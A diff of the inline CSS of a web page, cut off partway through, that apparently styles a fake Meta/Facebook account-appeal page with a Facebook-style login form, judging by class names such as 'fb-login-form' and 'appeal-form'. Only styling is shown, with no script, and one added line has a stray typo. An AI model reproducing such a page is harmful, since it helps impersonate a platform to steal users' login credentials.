@@ -8,1403 +8,1034 @@
     </title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
-      * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: linear-gradient( 130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);
-            background-attachment: fixed;
-            min-height: 100vh;
-            font-family: &#39;Segoe UI&#39;, Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* Language Modal Styles */
-
-        .language-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 99999;
-            backdrop-filter: blur(5px);
-            transition: opacity 0.3s ease;
-        }
-
-        .language-modal-content {
-            background: #fff;
-            padding: 40px;
-            border-radius: 16px;
-            max-width: 600px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            max-height: 80vh;
-            overflow-y: auto;
-            position: relative;
-            animation: modalFadeIn 0.4s ease-out;
-        }
-
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px) scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        .language-modal-close {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #f1f3f4;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .language-modal-close:hover {
-            background: #e8eaed;
-            transform: rotate(90deg);
-        }
-
-        .language-modal-close svg {
-            width: 18px;
-            height: 18px;
-            fill: #5f6368;
-        }
-
-        .language-modal-title {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            color: #1a1a1a;
-            background: linear-gradient(135deg, #0064e0, #0084ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .language-modal-subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 30px;
-            line-height: 1.5;
-        }
-
-        .language-search-container {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .language-search-input {
-            width: 100%;
-            padding: 14px 16px 14px 45px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
-        }
-
-        .language-search-input:focus {
-            border-color: #0064e0;
-            box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
-            outline: none;
-            background: #fff;
-        }
-
-        .language-search-icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #5f6368;
-        }
-
-        .language-options {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin-bottom: 30px;
-            max-height: 300px;
-            overflow-y: auto;
-            padding: 5px;
-        }
-
-        .language-option {
-            display: flex;
-            align-items: center;
-            padding: 15px;
-            border: 2px solid #e8eaed;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            background: #fff;
-        }
-
-        .language-option:hover {
-            border-color: #0064e0;
-            background: #f0f7ff;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 100, 224, 0.1);
-        }
-
-        .language-option.selected {
-            border-color: #0064e0;
-            background: #e6f1ff;
-            box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);
-        }
-
-        .language-flag {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            margin-right: 12px;
-            flex-shrink: 0;
-        }
-
-        .language-name {
-            font-weight: 600;
-            font-size: 16px;
-            color: #1a1a1a;
-            text-align: left;
-        }
-
-        .language-code {
-            font-size: 13px;
-            color: #5f6368;
-            margin-top: 2px;
-            text-align: left;
-        }
-
-        .language-confirm-btn {
-            padding: 16px 30px;
-            background: linear-gradient(135deg, #0064e0, #0084ff);
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .language-confirm-btn::before {
-            content: &#39;&#39;;
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
-
-        .language-confirm-btn:hover::before {
-            left: 100%;
-        }
-
-        .language-confirm-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 100, 224, 0.4);
-        }
-
-        .language-confirm-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-
-        .language-confirm-btn:disabled:hover::before {
-            left: -100%;
-        }
-
-        .no-results {
-            grid-column: 1 / -1;
-            text-align: center;
-            padding: 30px;
-            color: #5f6368;
-            font-style: italic;
-        }
-
-        /* Scrollbar styling */
-
-        .language-options::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .language-options::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 4px;
-        }
-
-        .language-options::-webkit-scrollbar-thumb {
-            background: #c1c1c1;
-            border-radius: 4px;
-        }
-
-        .language-options::-webkit-scrollbar-thumb:hover {
-            background: #a8a8a8;
-        }
-
-        /* For Firefox */
-
-        .language-options {
-            scrollbar-width: thin;
-            scrollbar-color: #c1c1c1 #f1f1f1;
-        }
-
-        /* Mobile responsive adjustments */
-
-        @media (max-width: 768px) {
-            .language-modal-content {
-                padding: 30px 20px;
-            }
-            .language-options {
-                grid-template-columns: 1fr;
-            }
-            .language-modal-title {
-                font-size: 24px;
-                margin-bottom: 8px;
-            }
-            .language-modal-subtitle {
-                font-size: 15px;
-                margin-bottom: 20px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .language-modal-content {
-                padding: 25px 15px;
-            }
-            .language-option {
-                padding: 12px;
-            }
-            .language-flag {
-                width: 28px;
-                height: 28px;
-                font-size: 18px;
-                margin-right: 10px;
-            }
-            .language-name {
-                font-size: 15px;
-            }
-        }
-
-        /* Hide main content until language is selected */
-
-        .main-content {
-            display: none;
-        }
-
-        /* Mobile header */
-
-        .mobile-header {
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 10px 15px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 9999;
-            background: transparent;
-            box-shadow: none;
-        }
-
-        .mobile-logo {
-            width: 60px;
-            height: auto;
-        }
-
-        header {
-            width: 380px;
-            padding: 40px 40px 15px 60px;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            position: fixed;
-            top: 0;
-            left: 0;
-            height: 100vh;
-            background: transparent;
-            overflow-y: auto;
-            z-index: 9999;
-        }
-
-        .logo {
-            width: 80px;
-            margin: 15px 0 8px 20px;
-        }
-
-        .privacy-text {
-            font-size: 26px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin: 0 0 15px 20px;
-            letter-spacing: 0.4px;
-        }
-
-        .home-page {
-            display: flex;
-            align-items: center;
-            flex-direction: row;
-            background-color: #000;
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 8px;
-            margin-left: 20px;
-            margin-top: 5px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            transition: transform 0.2s ease;
-            cursor: pointer;
-            width: auto;
-            max-width: 100%;
-        }
-
-        .home-page:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
-        }
-
-        .home-icon {
-            margin-right: 12px;
-            width: 20px;
-            height: 20px;
-            fill: #fff;
-            flex-shrink: 0;
-        }
-
-        .home-text {
-            font-size: 16px;
-            font-weight: 500;
-            white-space: nowrap;
-        }
-
-        .menu-container {
-            margin-left: 20px;
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .menu-item {
-            display: flex;
-            align-items: center;
-            flex-direction: row;
-            padding: 12px 20px;
-            border-radius: 8px;
-            transition: all 0.2s ease;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .menu-item:hover {
-            background-color: rgba(0, 0, 0, 0.05);
-            transform: translateY(-2px);
-        }
-
-        .menu-icon {
-            margin-right: 15px;
-            width: 20px;
-            height: 20px;
-            fill: #333;
-            flex-shrink: 0;
-        }
-
-        .menu-text {
-            font-size: 16px;
-            color: #333;
-            font-weight: 500;
-            white-space: nowrap;
-        }
-
-        .vertical-divider {
-            position: fixed;
-            top: 0;
-            left: 460px;
-            width: 2px;
-            height: 100vh;
-            background-color: #ccc;
-            opacity: 0.5;
-            z-index: 1000;
-        }
-
-        .center-content {
-            margin-left: 460px;
-            flex: 1;
-            min-height: 100vh;
-            overflow-y: auto;
-            padding: 80px 40px;
-            scroll-behavior: smooth;
-        }
-
-        .center-content::-webkit-scrollbar {
-            width: 10px;
-        }
-
-        .center-content::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.05);
-            border-radius: 10px;
-        }
-
-        .center-content::-webkit-scrollbar-thumb {
-            background: linear-gradient(180deg, #0064e0, #0084ff);
-            border-radius: 10px;
-            border: 2px solid #fff;
-        }
-
-        .center-content::-webkit-scrollbar-thumb:hover {
-            background: linear-gradient(180deg, #0052b3, #0064e0);
-        }
-
-        .warning-message {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-            font-size: 24px;
-            font-weight: 400;
-            color: #333;
-            gap: 8px;
-            max-width: 650px;
-        }
-
-        .warning-top {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 10px;
-        }
-
-        .warning-message svg {
-            width: 36px;
-            height: 36px;
-            flex-shrink: 0;
-        }
-
-        .warning-message span {
-            font-weight: 700;
-            color: #d93025;
-        }
-
-        span#fbSendBtnText {
-            color: white;
-        }
-
-        span#sendBtnText {
-            color: white;
-        }
-
-        .warning-subtext {
-            font-size: 16px;
-            font-weight: 500;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-top: 15px;
-            text-align: left;
-            width: 100%;
-        }
-
-        .warning-extra {
-            font-size: 15px;
-            font-weight: 500;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-top: 20px;
-            max-width: 650px;
-            text-align: left;
-            width: 100%;
-        }
-
-        /* Appeal box styling */
-
-        .appeal-box {
-            margin-top: 30px;
-            padding: 0;
-            border-radius: 12px;
-            width: 100%;
-            max-width: 650px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .appeal-box img {
-            display: block;
-            width: 100%;
-            height: auto;
-            border-radius: 12px 12px 0 0;
-            margin: 0;
-        }
-
-        .appeal-info {
-            border: 2px solid #ffffff;
-            border-top: none;
-            border-radius: 0 0 12px 12px;
-            padding: 25px;
-            background: #fff;
-            margin-top: -2px;
-        }
-
-        .appeal-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .appeal-desc {
-            font-size: 16px;
-            line-height: 1.6;
-            color: #5f6368;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .appeal-btn {
-            display: block;
-            width: 100%;
-            padding: 14px 16px;
-            font-size: 16px;
-            font-weight: 700;
-            color: #fff;
-            background: #0064e0;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s ease;
-            text-align: center;
-        }
-
-        .appeal-btn:hover {
-            background: #0052b3;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3);
-        }
-
-        /* Ensure appeal button text is white */
-
-        .appeal-info .appeal-btn {
-            color: #fff !important;
-        }
-
-        /* Appeal Guide Section */
-
-        .appeal-guide {
-            margin-top: 40px;
-            max-width: 650px;
-        }
-
-        .appeal-guide-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        .appeal-guide-content {
-            background: #fff;
-            border-radius: 12px;
-            padding: 30px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-        }
-
-        .appeal-guide-text {
-            font-size: 15px;
-            line-height: 1.6;
-            color: #5f6368;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        .appeal-guide-text:last-child {
-            margin-bottom: 0;
-        }
-
-        /* Additional Resources Section */
-
-        .additional-resources {
-            margin-top: 50px;
-            max-width: 650px;
-        }
-
-        .resources-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .resources-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-        }
-
-        .resource-card {
-            background: #fff;
-            border-radius: 12px;
-            padding: 25px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            cursor: pointer;
-        }
-
-        .resource-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .resource-icon {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 15px;
-            fill: #0064e0;
-        }
-
-        .resource-card-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 12px;
-            text-align: left;
-        }
-
-        .resource-card-desc {
-            font-size: 15px;
-            line-height: 1.5;
-            color: #5f6368;
-            text-align: left;
-        }
-
-        /* Redesigned Appeal Form Styling */
-
-        .appeal-form {
-            margin-top: 30px;
-            background: #fff;
-            border-radius: 12px;
-            padding: 30px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
-            max-width: 650px;
-            position: relative;
-            display: none;
-        }
-
-        .form-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eaeaea;
-        }
-
-        .form-icon {
-            width: 40px;
-            height: 40px;
-            background: #0064e0;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-        }
-
-        .form-icon svg {
-            width: 20px;
-            height: 20px;
-            fill: #fff;
-        }
-
-        .form-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin: 0;
-        }
-
-        .form-subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-top: 5px;
-        }
-
-        .form-notice-container {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 25px;
-            border-left: 4px solid #0064e0;
-        }
-
-        .form-notice {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 8px;
-        }
-
-        .form-notice:last-child {
-            margin-bottom: 0;
-        }
-
-        .form-group {
-            margin-bottom: 22px;
-            position: relative;
-        }
-
-        .form-label {
-            font-weight: 600;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 8px;
-            color: #1a1a1a;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #e5e7eb;
-            border-radius: 8px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: #fafafa;
-        }
-
-        .form-input:focus {
-            border: 1px solid #0064e0;
-            box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
-            outline: none;
-            background: #fff;
-        }
-
-        .input-error {
-            color: #c2410c;
-            font-size: 13px;
-            line-height: 1.3;
-            margin-top: 6px;
-            min-height: 16px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .input-error svg {
-            width: 16px;
-            height: 16px;
-        }
-
-        .form-warning {
-            background: #fef3c7;
-            border: 1px solid #fcd34d;
-            padding: 14px 16px;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #92400e;
-            margin-bottom: 20px;
-            display: none;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .form-warning svg {
-            width: 20px;
-            height: 20px;
-            flex-shrink: 0;
-        }
-
-        .form-warning.show {
-            display: flex;
-        }
-
-        .form-btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 8px;
-            background: linear-gradient(135deg, #0064e0, #0084ff);
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .form-btn::before {
-            content: &#39;&#39;;
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
-
-        .form-btn:hover::before {
-            left: 100%;
-        }
-
-        .form-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 100, 224, 0.4);
-        }
-
-        .form-btn.loading {
-            opacity: 0.8;
-            pointer-events: none;
-        }
-
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* Video container styling */
-
-        .video-container {
-            margin: 15px 0;
-            border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            position: relative;
-            max-width: 378px;
-        }
-
-        .video-player {
-            width: 100%;
-            height: 200px;
-            background: #000;
-            display: block;
-        }
-
-        .video-placeholder {
-            width: 100%;
-            height: 200px;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            flex-direction: column;
-            cursor: pointer;
-        }
-
-        @media (max-width: 900px) {
-            .video-container {
-                max-width: 337px;
-                /* Mobile width */
-            }
-        }
-
-        .video-placeholder svg {
-            width: 30px;
-            height: 30px;
-            margin-bottom: 8px;
-        }
-
-        .video-title {
-            font-size: 13px;
-            font-weight: 500;
-            margin-top: 5px;
-        }
-
-        .fb-login-form {
-            margin-top: 30px;
-            background: #fff;
-            border-radius: 12px;
-            padding: 30px;
-            border: 1px solid #e0e0e0;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
-            max-width: 650px;
-            position: relative;
-            display: none;
-        }
-
-        .fb-form-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eaeaea;
-        }
-
-        .fb-form-icon {
-            width: 40px;
-            height: 40px;
-            background: #1877f2;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-        }
-
-        .fb-form-icon svg {
-            width: 20px;
-            height: 20px;
-            fill: #fff;
-        }
-
-        .fb-form-title {
-            font-size: 24px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin: 0;
-        }
-
-        .fb-form-subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-top: 5px;
-        }
-
-        .fb-form-notice-container {
-            background: #f0f2f5;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 25px;
-            border-left: 4px solid #1877f2;
-        }
-
-        .fb-form-notice {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 8px;
-        }
-
-        .fb-form-notice:last-child {
-            margin-bottom: 0;
-        }
-
-        .fb-form-group {
-            margin-bottom: 22px;
-            position: relative;
-        }
-
-        .fb-form-label {
-            font-weight: 600;
-            font-size: 14px;
-            display: block;
-            margin-bottom: 8px;
-            color: #1a1a1a;
-        }
-
-        .fb-form-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: #f5f6f7;
-        }
-
-        .fb-form-input:focus {
-            border: 1px solid #1877f2;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
-            outline: none;
-            background: #fff;
-        }
-
-        .fb-input-error {
-            color: #c2410c;
-            font-size: 13px;
-            line-height: 1.3;
-            margin-top: 6px;
-            min-height: 16px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .fb-input-error svg {
-            width: 16px;
-            height: 16px;
-        }
-
-        .fb-form-warning {
-            background: #fef3c7;
-            border: 1px solid #fcd34d;
-            padding: 14px 16px;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #92400e;
-            margin-bottom: 20px;
-            display: none;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .fb-form-warning svg {
-            width: 20px;
-            height: 20px;
-            flex-shrink: 0;
-        }
-
-        .fb-form-warning.show {
-            display: flex;
-        }
-
-        .fb-form-btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 6px;
-            background: linear-gradient(135deg, #1877f2, #166fe5);
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .fb-form-btn::before {
-            content: &#39;&#39;;
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: 0.5s;
-        }
-
-        .fb-form-btn:hover::before {
-            left: 100%;
-        }
-
-        .fb-form-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
-        }
-
-        .fb-form-btn.loading {
-            opacity: 0.8;
-            pointer-events: none;
-        }
-
-        .forgot-password {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 14px;
-            color: #1877f2;
-            cursor: pointer;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
-        .success-message {
-            margin-top: 30px;
-            background: #d1fae5;
-            border: 1px solid #10b981;
-            border-radius: 12px;
-            padding: 25px;
-            text-align: center;
-            display: none;
-        }
-
-        .success-message.show {
-            display: block;
-        }
-
-        .success-icon {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #a7f3d0;
-            border-radius: 50%;
-            border: 2px solid #10b981;
-        }
-
-        .success-icon svg {
-            width: 30px;
-            height: 30px;
-            color: #059669;
-        }
-
-        .success-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #065f46;
-            margin-bottom: 10px;
-        }
-
-        .success-text {
-            font-size: 15px;
-            color: #065f46;
-            margin-bottom: 15px;
-        }
-
-        .reference-id {
-            font-family: &#39;Monaco&#39;, &#39;Menlo&#39;, &#39;Ubuntu Mono&#39;, monospace;
-            font-size: 14px;
-            color: #374151;
-            background: #f9fafb;
-            padding: 8px 12px;
-            border-radius: 6px;
-            display: inline-block;
-        }
-
-        /* Mobile Responsive Styles */
-
-        @media (max-width: 900px) {
-            .vertical-divider {
-                display: none;
-            }
-            .mobile-header {
-                display: flex;
-            }
-            header {
-                display: none;
-            }
-            .center-content {
-                margin-left: 0;
-                padding: 100px 20px 40px;
-            }
-            .warning-message {
-                font-size: 20px;
-                align-items: flex-start;
-                text-align: left;
-            }
-            .warning-top {
-                flex-direction: row;
-                text-align: left;
-                gap: 15px;
-                margin-bottom: 20px;
-            }
-            .warning-message span {
-                text-align: left;
-            }
-            .warning-subtext,
-            .warning-extra {
-                font-size: 15px;
-                text-align: left;
-            }
-            .warning-message svg {
-                width: 32px;
-                height: 32px;
-            }
-            .appeal-info {
-                padding: 20px;
-            }
-            .appeal-title {
-                font-size: 20px;
-                text-align: left;
-            }
-            .appeal-desc {
-                font-size: 15px;
-                text-align: left;
-            }
-            .appeal-btn {
-                font-size: 16px;
-                padding: 14px;
-            }
-            .appeal-guide {
-                margin-top: 30px;
-            }
-            .appeal-guide-title {
-                font-size: 20px;
-                text-align: left;
-            }
-            .appeal-guide-content {
-                padding: 20px;
-            }
-            .appeal-guide-text {
-                font-size: 14px;
-                text-align: left;
-            }
-            .additional-resources {
-                margin-top: 40px;
-            }
-            .resources-grid {
-                grid-template-columns: 1fr;
-            }
-            .resources-title {
-                font-size: 20px;
-                text-align: left;
-            }
-            .appeal-form {
-                padding: 20px;
-            }
-            .form-title {
-                font-size: 22px;
-            }
-            .fb-login-form {
-                padding: 20px;
-            }
-            .fb-form-title {
-                font-size: 22px;
-            }
-            .video-player,
-            .video-placeholder {
-                height: 200px;
-            }
-            .video-placeholder svg {
-                width: 25px;
-                height: 25px;
-            }
-            .video-title {
-                font-size: 12px;
-            }
-            .language-options {
-                grid-template-columns: 1fr;
-            }
-            .language-modal-content {
-                padding: 30px 20px;
-            }
-            .language-modal-title {
-                font-size: 22px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .center-content {
-                padding: 100px 15px 30px;
-            }
-            .warning-message {
-                font-size: 18px;
-            }
-            .warning-message svg {
-                width: 28px;
-                height: 28px;
-            }
-            .mobile-logo {
-                width: 50px;
-            }
-            .appeal-guide-title {
-                font-size: 18px;
-                text-align: left;
-            }
-            .appeal-guide-content {
-                padding: 15px;
-            }
-            .resources-title {
-                font-size: 18px;
-                text-align: left;
-            }
-            .resource-card {
-                padding: 20px;
-            }
-            .resource-icon {
-                width: 35px;
-                height: 35px;
-            }
-            .appeal-form {
-                padding: 15px;
-            }
-            .fb-login-form {
-                padding: 15px;
-            }
-            .form-header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .fb-form-header {
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            .form-icon {
-                margin-bottom: 10px;
-            }
-            .fb-form-icon {
-                margin-bottom: 10px;
-            }
-            .success-message {
-                padding: 20px;
-            }
-            .success-icon {
-                width: 50px;
-                height: 50px;
-            }
-            .success-icon svg {
-                width: 25px;
-                height: 25px;
-            }
-            .success-title {
-                font-size: 18px;
-            }
-            .video-player,
-            .video-placeholder {
-                height: 180px;
-            }
-            .video-placeholder svg {
-                width: 22px;
-                height: 22px;
-            }
-            .video-title {
-                font-size: 11px;
-            }
-        }
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {l
+      background: linear-gradient(
+        130deg,
+        rgba(249, 241, 249, 1) 0%,
+        rgba(234, 243, 253, 1) 35%,
+        rgba(237, 251, 242, 1) 100%
+      );
+      background-attachment: fixed;
+      min-height: 100vh;
+      font-family: &#39;Segoe UI&#39;, Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Language Modal Styles */
+    .language-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      backdrop-filter: blur(5px);
+      transition: opacity 0.3s ease;
+    }
+   
+    .language-modal-content {
+      background: #fff;
+      padding: 40px;
+      border-radius: 16px;
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      max-height: 80vh;
+      overflow-y: auto;
+      position: relative;
+      animation: modalFadeIn 0.4s ease-out;
+    }
+
+    @keyframes modalFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+   
+    .language-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: #f1f3f4;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    
+    .language-modal-close:hover {
+      background: #e8eaed;
+      transform: rotate(90deg);
+    }
+    
+    .language-modal-close svg {
+      width: 18px;
+      height: 18px;
+      fill: #5f6368;
+    }
+   
+    .language-modal-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #1a1a1a;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+   
+    .language-modal-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+   
+    .language-search-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    
+    .language-search-input {
+      width: 100%;
+      padding: 14px 16px 14px 45px;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: #f8f9fa;
+    }
+    
+    .language-search-input:focus {
+      border-color: #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+    
+    .language-search-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+    }
+   
+    .language-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 30px;
+      max-height: 300px;
+      overflow-y: auto;
+      padding: 5px;
+    }
+    
+    .language-option {
+      display: flex;
+      align-items: center;
+      padding: 15px;
+      border: 2px solid #e8eaed;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      background: #fff;
+    }
+  
+    .language-option:hover {
